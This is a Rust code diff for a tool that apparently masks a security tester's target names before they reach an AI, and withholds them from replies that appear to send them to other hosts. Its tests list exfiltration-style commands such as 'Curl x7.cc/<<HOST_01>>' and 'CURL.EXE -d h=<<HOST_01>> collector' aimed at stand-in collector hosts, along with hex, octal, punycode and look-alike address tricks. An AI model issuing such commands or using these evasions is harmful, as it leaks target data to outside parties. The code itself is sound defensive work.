@@ -1164,6 +1164,107 @@ fn is_named_host(value: &str) -> bool {
         && (value.contains('.') || is_single_label_name(value))
 }
 
+/// The names a text gives a machine or a domain as such (`Computer name:
+/// X`, nbstat's name table).
+fn named_hosts(text: &str) -> Vec<String> {
+    [&*NAMED_HOST, &*NBSTAT_NAME]
+        .into_iter()
+        .flat_map(|regex| regex.captures_iter(text))
+        .filter_map(|c| c.get(1))
+        .map(|part| part.as_str().trim_end_matches('.').to_owned())
+        .filter(|value| is_named_host(value))
+        .collect()
+}
+
+/// The domains of the LDAP names in a text: `DC=corp,DC=example,DC=com` is
+/// corp.example.com, written `corp,DC=example`.
+fn dn_domains(text: &str) -> Vec<(String, String)> {
+    DN_DOMAIN
+        .find_iter(text)
+        .filter_map(|run| {
+            let ((start, end), domain) = dn_domain(run.as_str())?;
+            Some((run.as_str()[start..end].to_owned(), domain))
+        })
+        .collect()
+}
+
+/// The `CN=` and `OU=` names in a text worth masking: `CN=FILESRV01,...`
+/// names a machine (or a person, a group).
+fn dn_names(text: &str) -> Vec<String> {
+    DN_NAME_PART
+        .captures_iter(text)
+        .filter_map(|c| c.get(1))
+        .map(|part| part.as_str().trim_end().to_owned())
+        .filter(|value| is_dn_name(value))
+        .collect()
+}
+
+/// What [`Vault::learn`] takes from `text` as a host's own one-word name,
+/// in lower case.
+fn taught_words(text: &str) -> Vec<String> {
+    let named = named_hosts(text)
+        .into_iter()
+        .filter(|value| !value.contains('.'));
+    let written = dn_domains(text)
+        .into_iter()
+        .map(|(written, _)| written)
+        .filter(|written| written.contains('=') || is_single_label_name(written));
+    named
+        .chain(written)
+        .chain(dn_names(text))
+        .map(|word| word.to_ascii_lowercase())
+        .collect()
+}
+
+/// The scan text of a host that can say what it is called: its scripts'
+/// output and other facts, what each port runs, its system.
+fn host_texts(host: &Host) -> impl Iterator<Item = &str> {
+    let facts = host
+        .facts
+        .iter()
+        .chain(host.ports.values().flat_map(|port| &port.facts))
+        .map(|fact| fact.claim.as_str());
+    let ports = host.ports.values().flat_map(|port| {
+        [&port.product, &port.version, &port.extra_info]
+            .into_iter()
+            .flatten()
+            .map(String::as_str)
+    });
+    facts.chain(ports).chain(host.os.as_deref())
+}
+
+/// Whether the name at `text[start..end]` stands as a host: of a link or a
+/// mail address (`//payroll/`, `admin@payroll`), a share (`\\payroll\`), a
+/// port (`payroll:8443`) or an account (`ACME\jsmith`). Whatever word a
+/// host calls itself, masking it there hides no product or advisory.
+fn stands_as_host(text: &str, start: usize, end: usize) -> bool {
+    let bytes = text.as_bytes();
+    let in_word = |b: &u8| b.is_ascii_alphanumeric() || *b == b'_';
+    let before = text.get(..start).unwrap_or("");
+    let mail = before
+        .strip_suffix('@')
+        .is_some_and(|rest| rest.as_bytes().last().is_some_and(in_word));
+    let after = bytes.get(end + 1..).unwrap_or_default();
+    let digits = after.iter().take_while(|b| b.is_ascii_digit()).count();
+    let port = bytes.get(end) == Some(&b':')
+        && (1..=5).contains(&digits)
+        && !after.get(digits).is_some_and(|b| *b == b'.' || in_word(b));
+    let account = bytes.get(end) == Some(&b'\\') && after.first().is_some_and(in_word);
+    before.ends_with("//") || before.ends_with("\\\\") || mail || port || account
+}
+
+/// Whether an advisory's number starts at `at`: `-2021-23017`, `-21-123`,
+/// `-2021:1234` (`CVE-2021-23017`, `ZDI-21-123`, `ALSA-2021:1234`).
+/// Whatever word it begins with, it is not a name.
+fn advisory_number_at(bytes: &[u8], at: usize) -> bool {
+    let after = bytes.get(at + 1..).unwrap_or_default();
+    let digits = after.iter().take_while(|b| b.is_ascii_digit()).count();
+    bytes.get(at) == Some(&b'-')
+        && (2..=4).contains(&digits)
+        && matches!(after.get(digits), Some(b'-' | b':'))
+        && after.get(digits + 1).is_some_and(u8::is_ascii_digit)
+}
+
 /// The domain a run of `DC=` parts names (`DC=corp,DC=example,DC=com`), as
 /// one: the span from the first part of it that is the owner's own to the
 /// last (`corp,DC=example`), and the domain written with dots
@@ -1358,14 +1459,20 @@ pub struct Vault {
     /// Registered names and user names by their first word, in lower case,
     /// so that finding them in a text does not mean trying each one.
     by_first_word: HashMap<String, Vec<(Kind, String)>>,
-    /// One-word names only a certificate gives (a SAN `intranet`), and
-    /// those a host is called otherwise. A certificate can name itself
-    /// anything (`jquery`), so a one-word name only it gives is looked for
-    /// in a request about a host that presents it ([`Vault::scope_to`]),
-    /// not in every request of the workspace.
+    /// One-word names a host gives itself: only its certificate (a SAN
+    /// `intranet`), or its scan text (`Computer name: FILESRV`, kept by
+    /// host in `taught_by`). A host can call itself anything (`jquery`),
+    /// so such a name is looked for as a word in requests about that host
+    /// ([`Vault::scope_to`]), and in others only where it stands as a host
+    /// (`//payroll/`, `ACME\jsmith`). `named_words` are those a scan or a
+    /// lookup gives as a host's name, or text with no host in scope:
+    /// looked for everywhere.
     cert_words: HashSet<String>,
+    taught_words: HashSet<String>,
+    taught_by: HashMap<String, HashSet<String>>,
     named_words: HashSet<String>,
-    /// The one-word certificate names of the host a request is about.
+    /// The host a request is about, and its own one-word names.
+    scope_host: Option<String>,
     scope: HashSet<String>,
     /// Set while [`Vault::register_graph`] registers certificate names.
     registering_cert: bool,
@@ -2013,7 +2120,18 @@ impl Vault {
     pub fn register_graph(&mut self, graph: &Graph) {
         self.cert_words.clear();
         self.scope.clear();
+        self.scope_host = None;
         for host in graph.hosts.values() {
+            // What its scan text calls it, wherever its request was masked
+            // first (an earlier session's names are in state.db).
+            let taught: Vec<String> = host_texts(host).flat_map(taught_words).collect();
+            if !taught.is_empty() {
+                self.taught_words.extend(taught.iter().cloned());
+                self.taught_by
+                    .entry(host.address.clone())
+                    .or_default()
+                    .extend(taught);
+            }
             match host
                 .address
                 .split('%')
@@ -2077,9 +2195,10 @@ impl Vault {
         }
     }
 
-    /// Masking from here on is for a request about `host`: its one-word
-    /// certificate names are looked for too (see [`Vault::register_graph`],
-    /// which ends this).
+    /// Masking from here on is for a request about `host`: the one-word
+    /// names its certificates and its scan text give it are looked for as
+    /// words too, and what its text teaches is its own (see
+    /// [`Vault::register_graph`], which ends this).
     pub fn scope_to(&mut self, host: &Host) {
         self.scope = host
             .ports
@@ -2087,7 +2206,36 @@ impl Vault {
             .flat_map(|port| &port.tls_sans)
             .map(|san| normal_name(san))
             .filter(|san| !san.contains('.'))
+            .chain(
+                self.taught_by
+                    .get(&host.address)
+                    .into_iter()
+                    .flatten()
+                    .cloned(),
+            )
             .collect();
+        self.scope_host = Some(host.address.clone());
+    }
+
+    /// A one-word name a text gives a machine or a domain (`Computer name:
+    /// FILESRV`): the host a request is about calls itself so (see
+    /// [`Vault::looks_for`]). With no host in scope it is looked for
+    /// everywhere.
+    fn learnt_word(&mut self, word: &str) {
+        let word = word.to_ascii_lowercase();
+        match &self.scope_host {
+            Some(host) => {
+                self.taught_by
+                    .entry(host.clone())
+                    .or_default()
+                    .insert(word.clone());
+                self.taught_words.insert(word.clone());
+                self.scope.insert(word);
+            }
+            None => {
+                self.named_words.insert(word);
+            }
+        }
     }
 
     /// [`Vault::stream_for_host`] for a request about `host`: its address
@@ -2103,12 +2251,14 @@ impl Vault {
         self.stream_for_host(request, &names, &certificate_names)
     }
 
-    /// Whether the one-word name `word` (lower case) is looked for: not
-    /// when only a certificate of another host gives it.
+    /// Whether the one-word name `word` (lower case) is looked for as a
+    /// word: not when only another host's certificate or scan text gives
+    /// it. It is then looked for where it stands as a host only
+    /// ([`stands_as_host`]).
     fn looks_for(&self, word: &str) -> bool {
-        !self.cert_words.contains(word)
-            || self.named_words.contains(word)
+        self.named_words.contains(word)
             || self.scope.contains(word)
+            || !(self.cert_words.contains(word) || self.taught_words.contains(word))
     }
 
     /// Registers the operator's own login name, which turns up in prompts,
@@ -2299,14 +2449,10 @@ impl Vault {
                 let word_end = at + bytes[at..].iter().take_while(|b| in_word(**b)).count();
                 if let Some(candidates) = self.by_first_word.get(&lower[at..word_end]) {
                     for (kind, needle) in candidates {
-                        if *kind == Kind::Dom && !self.looks_for(needle) {
-                            continue;
-                        }
                         let end = at + needle.len();
-                        // `CVE-2021-23017`, `GHSA-...`, `ZDI-21-123`: a
-                        // number, whatever word it begins with.
-                        if bytes.get(end) == Some(&b'-')
-                            && bytes.get(end + 1).is_some_and(u8::is_ascii_digit)
+                        if *kind == Kind::Dom
+                            && ((!self.looks_for(needle) && !stands_as_host(&lower, at, end))
+                                || advisory_number_at(bytes, end))
                         {
                             continue;
                         }
@@ -2335,16 +2481,9 @@ impl Vault {
     /// `user=Y`), so that the same name is masked wherever else it stands,
     /// also in a string that is masked before this one.
     fn learn(&mut self, text: &str) {
-        let named: Vec<String> = [&*NAMED_HOST, &*NBSTAT_NAME]
-            .into_iter()
-            .flat_map(|regex| regex.captures_iter(text))
-            .filter_map(|c| c.get(1))
-            .map(|part| part.as_str().trim_end_matches('.').to_owned())
-            .filter(|value| is_named_host(value))
-            .collect();
-        for value in named {
+        for value in named_hosts(text) {
             if !value.contains('.') {
-                self.named_words.insert(value.to_ascii_lowercase());
+                self.learnt_word(&value);
                 self.register(Kind::Dom, &value);
                 continue;
             }
@@ -2360,30 +2499,15 @@ impl Vault {
                 }
             }
         }
-        // An LDAP name: `DC=corp,DC=example,DC=com` is corp.example.com,
-        // and `CN=FILESRV01,...` names a machine (or a person, a group).
-        let domains: Vec<(String, String)> = DN_DOMAIN
-            .find_iter(text)
-            .filter_map(|run| {
-                let ((start, end), domain) = dn_domain(run.as_str())?;
-                Some((run.as_str()[start..end].to_owned(), domain))
-            })
-            .collect();
-        for (written, domain) in domains {
+        for (written, domain) in dn_domains(text) {
             self.register_name(&domain);
             if written.contains('=') || is_single_label_name(&written) {
-                self.named_words.insert(written.to_ascii_lowercase());
+                self.learnt_word(&written);
                 self.register(Kind::Dom, &written);
             }
         }
-        let names: Vec<String> = DN_NAME_PART
-            .captures_iter(text)
-            .filter_map(|c| c.get(1))
-            .map(|part| part.as_str().trim_end().to_owned())
-            .filter(|value| is_dn_name(value))
-            .collect();
-        for name in names {
-            self.named_words.insert(name.to_ascii_lowercase());
+        for name in dn_names(text) {
+            self.learnt_word(&name);
             self.register(Kind::Dom, &name);
         }
         let users: Vec<String> = NAMED_USER
@@ -2789,158 +2913,117 @@ fn is_reachable_v4(ip: std::net::Ipv4Addr) -> bool {
         || (first == 100 && (64..128).contains(&second)))
 }
 
-/// Endings of file names: a name whose last part is one of these and no
-/// listed top-level domain (`nginx.conf`, `jquery.min.js`) is a file, not
-/// a host.
+/// Endings of file names that are no top-level domain: a name ending in
+/// one (`nginx.conf`, `jquery.min.js`) is a file, not a host.
 const FILE_ENDINGS: &[&str] = &[
-    "html",
-    "htm",
-    "xhtml",
-    "php",
-    "phtml",
-    "asp",
-    "aspx",
-    "ashx",
-    "asmx",
-    "axd",
-    "jsp",
-    "jspx",
-    "cgi",
-    "action",
-    "js",
-    "mjs",
-    "cjs",
-    "ts",
-    "tsx",
-    "jsx",
-    "map",
-    "css",
-    "scss",
-    "less",
-    "json",
-    "xml",
-    "yml",
-    "yaml",
-    "toml",
-    "ini",
-    "conf",
-    "cfg",
-    "config",
-    "env",
-    "properties",
-    "txt",
-    "log",
-    "rst",
-    "csv",
-    "tsv",
-    "sql",
-    "db",
-    "sqlite",
-    "bak",
-    "old",
-    "orig",
-    "swp",
-    "tmp",
-    "lock",
-    "pid",
-    "sock",
-    "gz",
-    "tgz",
-    "bz2",
-    "xz",
-    "tar",
-    "rar",
-    "jar",
-    "war",
-    "ear",
-    "class",
-    "pyc",
-    "rb",
-    "bash",
-    "ps1",
-    "psm1",
-    "bat",
-    "cmd",
-    "vbs",
-    "exe",
-    "dll",
-    "dylib",
-    "bin",
-    "img",
-    "iso",
-    "deb",
-    "rpm",
-    "msi",
-    "apk",
-    "png",
-    "jpg",
-    "jpeg",
-    "gif",
-    "svg",
-    "ico",
-    "webp",
-    "bmp",
-    "pdf",
-    "doc",
-    "docx",
-    "xls",
-    "xlsx",
-    "ppt",
-    "pptx",
-    "pem",
-    "crt",
-    "cer",
-    "der",
-    "key",
-    "pub",
-    "csr",
-    "p12",
-    "pfx",
-    "jks",
-    "cpp",
-    "hpp",
-    "cs",
-    "java",
-    "kt",
-    "swift",
-    "lua",
-    "service",
-    "socket",
-    "timer",
-    "htaccess",
-    "htpasswd",
-    "woff",
-    "woff2",
-    "ttf",
-    "eot",
-    "mp3",
-    "mp4",
-    "wsdl",
+    "html", "htm", "xhtml", "php", "phtml", "asp", "aspx", "ashx", "asmx", "axd", "jsp", "jspx",
+    "cgi", "action", "js", "mjs", "cjs", "ts", "tsx", "jsx", "css", "scss", "less", "json", "xml",
+    "yml", "yaml", "toml", "ini", "conf", "cfg", "config", "env", "txt", "log", "rst", "csv",
+    "tsv", "sql", "db", "sqlite", "bak", "old", "orig", "swp", "tmp", "lock", "sock", "gz", "tgz",
+    "bz2", "xz", "tar", "rar", "jar", "war", "ear", "class", "pyc", "rb", "bash", "ps1", "psm1",
+    "bat", "cmd", "vbs", "exe", "dll", "dylib", "bin", "img", "iso", "deb", "rpm", "msi", "apk",
+    "png", "jpg", "jpeg", "gif", "svg", "ico", "webp", "bmp", "pdf", "doc", "docx", "xls", "xlsx",
+    "ppt", "pptx", "pem", "crt", "cer", "der", "key", "csr", "p12", "pfx", "jks", "cpp", "hpp",
+    "cs", "kt", "swift", "lua", "service", "socket", "timer", "htaccess", "htpasswd", "woff",
+    "woff2", "ttf", "eot", "mp3", "mp4", "wsdl",
 ];
+/// Top-level domains that are also endings of file names (`install.sh`,
+/// `id_rsa.pub`): a name under one is a host, unless it stands in a path.
+const FILE_ENDING_TLDS: &[&str] = &["map", "properties", "pid", "pub", "java"];
+
+/// A name with letters of any script: `x7.рф`, `ｘ７.ｃｃ`.
+static WIDE_NAME: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[\p{L}\p{N}_-]+(?:\.[\p{L}\p{N}_-]+)+").expect("valid regex"));
+/// Numbers joined by dots, in hex (`0xcb`) or octal (`0313`) too.
+static NUMBER_RUN: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?:0x[0-9a-f]+|[0-9]+)(?:\.(?:0x[0-9a-f]+|[0-9]+))+").expect("valid regex")
+});
+
+/// Whether the last part of a name can be a top-level domain: letters, or
+/// letters written as `xn--` (`xn--p1ai` is `рф`).
+fn is_tld_like(tld: &str) -> bool {
+    (tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_lowercase()))
+        || tld.strip_prefix("xn--").is_some_and(|rest| {
+            !rest.is_empty() && rest.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
+        })
+}
+
+/// The IPv4 address a run of two to four numbers stands for, as
+/// `inet_aton` (and so `curl`, `ping`) reads it: `0xcb.0.0x71.9`,
+/// `0313.0.0161.011`, `203.0.29961` and `203.7435017` are all
+/// 203.0.113.9 or near it. Not a version number (`1.21.0`, `20.04`),
+/// whose parts are all no more than 255, nor four plain numbers, which
+/// [`ipv4_spans`] finds.
+fn written_address(run: &str) -> Option<std::net::Ipv4Addr> {
+    let parts: Vec<&str> = run.split('.').collect();
+    if parts
+        .iter()
+        .all(|part| part.bytes().all(|b| b.is_ascii_digit()) && part.parse::<u8>().is_ok())
+    {
+        return None;
+    }
+    let values = parts
+        .iter()
+        .map(|part| match part.strip_prefix("0x") {
+            Some(hex) => u32::from_str_radix(hex, 16).ok(),
+            None if part.len() > 1 && part.starts_with('0') => u32::from_str_radix(part, 8).ok(),
+            None => part.parse::<u32>().ok(),
+        })
+        .collect::<Option<Vec<u32>>>()?;
+    let byte = |value: u32| value <= 0xff;
+    let number = match values[..] {
+        [a, b] if byte(a) && b <= 0xff_ffff => (a << 24) | b,
+        [a, b, c] if byte(a) && byte(b) && c <= 0xffff => (a << 24) | (b << 16) | c,
+        [a, b, c, d] if [a, b, c, d].into_iter().all(byte) => (a << 24) | (b << 16) | (c << 8) | d,
+        _ => return None,
+    };
+    Some(std::net::Ipv4Addr::from(number))
+}
 
 /// Whether a word of a reply names, in clear, a place other than the
 /// user's own target: a host name (`verify.attacker.example`,
-/// `<<HOST_01>>.oast.example`, under any top-level domain, listed or not)
-/// or a web address that is not a software maker's or an advisory
-/// database's, a public IPv4 address however written (`198.51.100.7`,
-/// `3325256839`, `0xc6336407`), or an IPv6 address. `word` has its
+/// `<<HOST_01>>.oast.example`, `x7.cc`, `c2.example.xn--p1ai`, `x7.рф`,
+/// under any top-level domain, listed or not) or a web address that is not
+/// a software maker's or an advisory database's, a public IPv4 address
+/// however written (`198.51.100.7`, `3325256839`, `0xc6336407`,
+/// `0xc6.51.100.7`, `198.3368199`), or an IPv6 address. `word` has its
 /// placeholders written as `T` and is in lower case.
 fn names_elsewhere(word: &str) -> bool {
+    // `x7。example`: a wide full stop is a dot to a resolver.
+    let word = &word.replace(['\u{3002}', '\u{FF0E}', '\u{FF61}'], ".");
     let named = HOSTNAME.find_iter(word).any(|found| {
         let name = found.as_str();
         let tld = name.rsplit('.').next().unwrap_or("");
-        INTERNAL_TLDS.contains(&tld)
-            || is_public_host_name(name)
-            || (tld.len() >= 2
-                && tld.bytes().all(|b| b.is_ascii_lowercase())
-                && !PUBLIC_TLDS.contains(&tld)
-                && !FILE_ENDINGS.contains(&tld)
-                && !is_public_name(name))
+        let before = &word[..found.start()];
+        // `/opt/install.sh`, `~/.ssh/id_rsa.pub`: a file in a path.
+        let in_path = before.ends_with(['/', '\\']) && !before.ends_with("//");
+        let file = FILE_ENDINGS.contains(&tld)
+            || (in_path && (FILE_LIKE_TLDS.contains(&tld) || FILE_ENDING_TLDS.contains(&tld)));
+        INTERNAL_TLDS.contains(&tld) || (is_tld_like(tld) && !file && !is_public_name(name))
     });
+    // `x7.рф`, `x7.аttacker.com`: a name written in other letters.
+    let wide = !word.is_ascii()
+        && WIDE_NAME.find_iter(word).any(|found| {
+            let name = found.as_str();
+            let tld = name.rsplit('.').next().unwrap_or("");
+            !name.is_ascii()
+                && tld.chars().count() >= 2
+                && tld.chars().any(char::is_alphabetic)
+                && !FILE_ENDINGS.contains(&tld)
+        });
     let address = ipv4_spans(word).any(|(start, end)| {
         word[start..end]
             .parse::<std::net::Ipv4Addr>()
             .is_ok_and(is_reachable_v4)
+    }) || NUMBER_RUN.find_iter(word).any(|found| {
+        let bytes = word.as_bytes();
+        let free = !(found.start() > 0
+            && (bytes[found.start() - 1].is_ascii_alphanumeric()
+                || matches!(bytes[found.start() - 1], b'.' | b'_')))
+            && !bytes
+                .get(found.end())
+                .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_');
+        free && written_address(found.as_str()).is_some_and(is_reachable_v4)
     });
     // `curl 3325256839`, `ping 0xc6336407`: one number is an address too.
     let number = word
@@ -2971,7 +3054,7 @@ fn names_elsewhere(word: &str) -> bool {
         let host = without_port(authority.rsplit('@').next().unwrap_or(authority));
         !host.is_empty() && !is_public_name(host.trim_end_matches('.'))
     });
-    named || address || number || ipv6 || linked
+    named || wide || address || number || ipv6 || linked
 }
 
 /// Programs that reach another host, and interpreters and shells, as a
@@ -3090,9 +3173,30 @@ const COMMAND_WORDS: &[&str] = &[
     "printf",
 ];
 
+/// Programs that ask a name server the command names: `host NAME
+/// SERVER`. In prose they are a word too (`the host <<HOST_01>>`), so they
+/// count with two arguments, or first on a line as typed.
+const NAME_SERVER_PROGRAMS: &[&str] = &["host", "dog", "doggo", "q", "adnshost"];
+
 /// Words that begin a shell command line in place of a program.
 const COMMAND_STARTS: &[&str] = &[
-    "export", "setx", "declare", "typeset", "readonly", "sudo", "doas", "eval", "exec", "nohup",
+    "export",
+    "setx",
+    "declare",
+    "typeset",
+    "readonly",
+    "sudo",
+    "doas",
+    "eval",
+    "exec",
+    "nohup",
+    "timeout",
+    "env",
+    "stdbuf",
+    "proxychains",
+    "proxychains4",
+    "torsocks",
+    "torify",
 ];
 
 /// A redirection to or from a file or a descriptor (`> /dev/null`,
@@ -3110,9 +3214,11 @@ static SHELL_VARIABLE: LazyLock<Regex> = LazyLock::new(|| {
 });
 /// A placeholder written straight into a longer name or address
 /// (`<<HOST_01>>.oast.example`, `<<HOST_01>>.<<DOM_02>>`,
-/// `<<HOST_01>>@collector`), also with the dot escaped or written wide.
+/// `<<HOST_01>>@collector`, `<<DOM_01>>-x.example`, `<<DOM_01>>x.example`),
+/// also with the dot escaped or written wide.
 static CHAINED: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?:>>|>>\\)[.@\x{3002}\x{FF0E}\x{FF61}](?:<<|[\p{L}\p{N}_])").expect("valid regex")
+    Regex::new(r"(?:>>|>>\\)[.@\x{3002}\x{FF0E}\x{FF61}](?:<<|[\p{L}\p{N}_])|>>[-\p{L}\p{N}]")
+        .expect("valid regex")
 });
 
 /// A line without its quote marks, list markers and leading spaces.
@@ -3163,11 +3269,36 @@ fn is_indented_code(line: &str) -> bool {
 }
 
 /// The program a word of a command names: `/usr/bin/curl`, `curl.exe`
-/// and `"curl` are `curl`.
+/// and `"curl` are `curl`, `CURL.EXE` is `CURL`.
 fn program_of(word: &str) -> &str {
     let word = word.trim_matches(['(', ')', '"', '\'']);
     let program = word.rsplit(['/', '\\']).next().unwrap_or(word);
-    program.strip_suffix(".exe").unwrap_or(program)
+    let cut = program.len().saturating_sub(4);
+    match program.get(cut..) {
+        Some(ending) if ending.eq_ignore_ascii_case(".exe") => &program[..cut],
+        _ => program,
+    }
+}
+
+/// Whether `words[at]` runs a program of `list`, with `arguments`
+/// arguments after it ([`is_argument`]). Typed in lower case that is all.
+/// In other case (`Curl`, `NSLOOKUP`, `Invoke-WebRequest`, which macOS,
+/// Windows and PowerShell run all the same) it takes one at least, and the
+/// first no number: `MySQL 5.7 on <<HOST_01>>` is prose.
+fn runs_program(list: &[&str], words: &[&str], at: usize, arguments: usize) -> bool {
+    let Some(word) = words.get(at) else {
+        return false;
+    };
+    let program = program_of(word);
+    if !list.iter().any(|name| name.eq_ignore_ascii_case(program)) {
+        return false;
+    }
+    let typed = !program.bytes().any(|b| b.is_ascii_uppercase());
+    let needed = if typed { arguments } else { arguments.max(1) };
+    let after = &words[at + 1..];
+    after.len() >= needed
+        && after[..needed].iter().all(|word| is_argument(word))
+        && (typed || !after[0].starts_with(|c: char| c.is_ascii_digit()))
 }
 
 /// Whether the words of a command line start here: a program, a shell
@@ -3176,8 +3307,10 @@ fn starts_command(words: &[&str]) -> bool {
     let Some(first) = words.first() else {
         return false;
     };
-    COMMAND_WORDS.contains(&program_of(first))
-        || COMMAND_STARTS.contains(first)
+    runs_program(COMMAND_WORDS, words, 0, 0)
+        || runs_program(COMMAND_STARTS, words, 0, 0)
+        || (runs_program(NAME_SERVER_PROGRAMS, words, 0, 1)
+            && !first.bytes().any(|b| b.is_ascii_uppercase()))
         || first.starts_with(['$', '%'])
         || ["./", "../", "~/", ".\\"]
             .iter()
@@ -3194,9 +3327,11 @@ fn starts_command(words: &[&str]) -> bool {
 }
 
 /// Whether a word after a program is one of its arguments: a flag, an
-/// address, a name, a path, a number or a placeholder (`T`).
+/// address, a name, a path or query (`collector/?h=T`), a number or a
+/// placeholder (`T`).
 fn is_argument(word: &str) -> bool {
     word.starts_with(['-', '@', '$', '/', '\'', '"', '~', '.', '[', '<'])
+        || word.contains(['/', '?', '=', '@'])
         || word.starts_with(|c: char| c.is_ascii_digit())
         || word == "T"
         || word
@@ -3209,7 +3344,8 @@ fn is_argument(word: &str) -> bool {
 /// Whether a line of a reply reads as a command to run rather than as
 /// prose: code marks, shell operators and redirections, a prompt, a
 /// variable, a flag (`-d`), or a program run with an argument
-/// (`dig <<HOST_01>>`). A table row's `|` is not a pipe.
+/// (`dig <<HOST_01>>`, `Curl x7.example/<<HOST_01>>`, `host <<DOM_01>>
+/// <<DOM_02>>`). A table row's `|` is not a pipe.
 fn is_command_line(line: &str) -> bool {
     const MARKS: &[&str] = &[
         "`", "$(", "${", "&&", "||", "|&", "<<<", "<(", ">(", "&>", ">&", "/dev/tcp", "/dev/udp",
@@ -3241,8 +3377,8 @@ fn is_command_line(line: &str) -> bool {
             .strip_prefix('-')
             .map(|rest| rest.strip_prefix('-').unwrap_or(rest))
             .is_some_and(|rest| rest.starts_with(|c: char| c.is_ascii_alphabetic()));
-        flag || (COMMAND_WORDS.contains(&program_of(word))
-            && words.get(at + 1).is_some_and(|next| is_argument(next)))
+        flag || runs_program(COMMAND_WORDS, &words, at, 1)
+            || runs_program(NAME_SERVER_PROGRAMS, &words, at, 2)
     })
 }
 
@@ -3689,27 +3825,16 @@ impl StreamUnmasker {
     }
 
     /// Whether `unit` holds two different values of the target, one of
-    /// them only a certificate gives, and one of them is part of a longer
-    /// word (`<<DOM_02>>/?h=<<HOST_01>>`): a certificate can name a
-    /// collector. Each standing as a word of its own
-    /// (`<<HOST_01>> (<<DOM_02>>)`) is prose.
+    /// them only a certificate gives. A certificate can name a collector,
+    /// and any line can be a command for it, however it reads
+    /// (`host <<DOM_01>> <<DOM_02>>` asks it what the target is called).
     fn pairs_certificate(&self, unit: &str) -> bool {
-        let mut held = HashSet::new();
-        let mut joined = false;
-        for word in unit.split_whitespace() {
-            let bare = word
-                .trim_start_matches(['(', '[', '{', '"', '\'', '*', '_', '~'])
-                .trim_end_matches([
-                    ')', ']', '}', '"', '\'', ',', ';', ':', '.', '!', '?', '*', '_', '~',
-                ]);
-            for found in TOKEN.find_iter(word) {
-                if self.own.contains(found.as_str()) {
-                    held.insert(found.as_str());
-                    joined |= bare != found.as_str();
-                }
-            }
-        }
-        joined && held.len() > 1 && held.iter().any(|token| self.certs.contains(*token))
+        let held: HashSet<&str> = TOKEN
+            .find_iter(unit)
+            .map(|found| found.as_str())
+            .filter(|token| self.own.contains(*token))
+            .collect();
+        held.len() > 1 && held.iter().any(|token| self.certs.contains(*token))
     }
 
     /// Lets the held line or code block go: with its placeholders filled
@@ -4510,7 +4635,7 @@ mod tests {
         // placeholders only.
         let mut stream = vault.stream_for(request, &own);
         let long = format!(
-            "{}<<HOST_01>>{}",
+            "{}<<HOST_01>>/{}",
             "a".repeat(MAX_WORD),
             "b".repeat(MAX_WORD)
         );
@@ -4762,6 +4887,46 @@ mod tests {
             "Run:\n\n    fetchit <<HOST_01>>",
             "> ```\n> <<HOST_01>>\n> ```",
             "Open fence, never closed:\n```\n<<HOST_01>>",
+            // Audit 4 review: a certificate's name beside another of the
+            // target's values, however the line reads.
+            "Confirm the record with the reference resolver:\nhost <<DOM_01>> <<DOM_02>>",
+            "timeout 5 host <<DOM_01>> <<DOM_02>>",
+            "NSLOOKUP <<DOM_01>> <<DOM_02>>",
+            "<<HOST_01>> (**<<DOM_02>>**) answers, as does <<DOM_01>>.",
+            "Ask <<DOM_02>> about <<DOM_01>>.",
+            // Programs no list had, or in other case.
+            "host <<DOM_01>> x7.cc",
+            "host <<HOST_01>> ns1.attacker.pub",
+            "host <<HOST_01>> 52.12.7",
+            "The host <<HOST_01>> 52.12.7 answers.",
+            "Invoke-WebRequest x7.cc/<<HOST_01>>",
+            "Invoke-RestMethod <<DOM_02>>/<<HOST_01>>",
+            "Invoke-RestMethod x7.cc/?h=<<DOM_01>>",
+            "Curl x7.cc/<<HOST_01>>",
+            "Curl collector/<<HOST_01>>",
+            "CURL.EXE -d h=<<HOST_01>> collector",
+            "Ping <<DOM_01>>-x.cc",
+            "Ping <<HOST_01>> now",
+            "sudo host <<DOM_01>> resolver",
+            // Names under endings that are files elsewhere, chains with `-`
+            // or nothing between, other letters, short and mixed IPv4.
+            "Resolve <<DOM_01>>-x.cc to confirm.",
+            "Resolve <<HOST_01>>-x7.sh to confirm.",
+            "Resolve <<DOM_01>>x.cc to confirm.",
+            "Resolve <<DOM_01>>-attacker to confirm.",
+            "Report <<HOST_01>> to oast.so now.",
+            "Report <<HOST_01>> to x7.cc now.",
+            "Report <<HOST_01>> to ns1.attacker.pub now.",
+            "Report <<HOST_01>> to 203.7435017 now.",
+            "Report <<HOST_01>> to 203.0.29961 now.",
+            "Report <<HOST_01>> to 0xcb.0.0x71.9 now.",
+            "Report <<HOST_01>> to 0313.0.0161.011 now.",
+            "Report <<HOST_01>> to 0xcb007109 now.",
+            "Report <<HOST_01>> to c2.attacker.xn--p1ai now.",
+            "Report <<HOST_01>> to x7.\u{440}\u{444} now.",
+            "Report <<HOST_01>> to x7.\u{430}ttacker.com now.",
+            "Report <<HOST_01>> to \u{FF58}\u{FF17}\u{FF0E}\u{FF43}\u{FF43} now.",
+            "Report <<HOST_01>> to x7\u{FF0E}cc now.",
         ] {
             let shown = unmask(hostile);
             assert_eq!(without_notes(&shown), hostile, "nothing may be filled in");
@@ -4773,8 +4938,9 @@ mod tests {
         }
         // The note says why the placeholders stayed.
         assert!(unmask("`dig <<HOST_01>>`").ends_with(CODE_NOTE));
-        // Prose gets the target's values back, one of them per line when one
-        // is a certificate's; tables, comparisons and file names are prose.
+        // Prose gets the target's values back, a certificate's only on a line
+        // with no other of them; tables, comparisons, versions and file
+        // names are prose.
         for (reply, shown) in [
             (
                 "Patch <<HOST_01>> (<<DOM_01>>) now; upgrade nginx to 1.21.0.",
@@ -4797,12 +4963,28 @@ mod tests {
                 "The certificate names collect.attacker.com.",
             ),
             (
-                "<<HOST_01>> (**<<DOM_02>>**) answers, as does <<DOM_01>>.",
-                "10.20.30.40 (**collect.attacker.com**) answers, as does intranet-db.corp.example.com.",
+                "<<HOST_01>> runs Ubuntu 20.04 with MySQL 5.7.33 and OpenSSL 1.1.1k.",
+                "10.20.30.40 runs Ubuntu 20.04 with MySQL 5.7.33 and OpenSSL 1.1.1k.",
+            ),
+            (
+                "The host <<HOST_01>> runs nginx; run /opt/install.sh there.",
+                "The host 10.20.30.40 runs nginx; run /opt/install.sh there.",
+            ),
+            (
